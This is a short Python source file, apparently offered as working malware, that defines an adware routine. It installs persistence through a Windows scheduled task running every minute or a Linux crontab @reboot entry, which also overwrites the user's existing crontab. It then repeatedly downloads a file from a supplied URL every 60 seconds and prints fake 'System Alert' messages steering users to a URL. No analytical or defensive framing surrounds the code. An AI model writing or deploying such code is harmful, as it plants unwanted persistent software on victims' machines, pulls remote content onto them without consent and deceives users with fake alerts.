import os
import platform
import requests
import time
import subprocess
from threading import Thread

def adware_auto_download_files_fake_alerts(download_url: str, alert_url: str) -> None:
    def download_file(url):
        response = requests.get(url)
        if response.status_code == 200:
            with open('downloaded_file', 'wb') as file:
                file.write(response.content)
            print("File downloaded successfully.")
        else:
            print("Failed to download file.")

    def display_alert(url):
        print(f"System Alert: Visit {url} for important updates!")

    def create_persistence():
        system = platform.system()
        if system == "Windows":
            service_name = "AdwareService"
            command = f'schtasks /create /tn {service_name} /tr "pythonw {os.path.abspath(__file__)}" /sc minute /mo 1'
        elif system == "Linux":
            service_name = "adware"
            command = f'echo "@reboot python3 {os.path.abspath(__file__)}" | crontab -'
        else:
            print("Unsupported operating system.")
            return
        subprocess.run(command, shell=True)

    def run_adware():
        while True:
            download_file(download_url)
            display_alert(alert_url)
            time.sleep(60)

    create_persistence()
    adware_thread = Thread(target=run_adware)
    adware_thread.daemon = True
    adware_thread.start()

    # Keep the main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Adware stopped.")
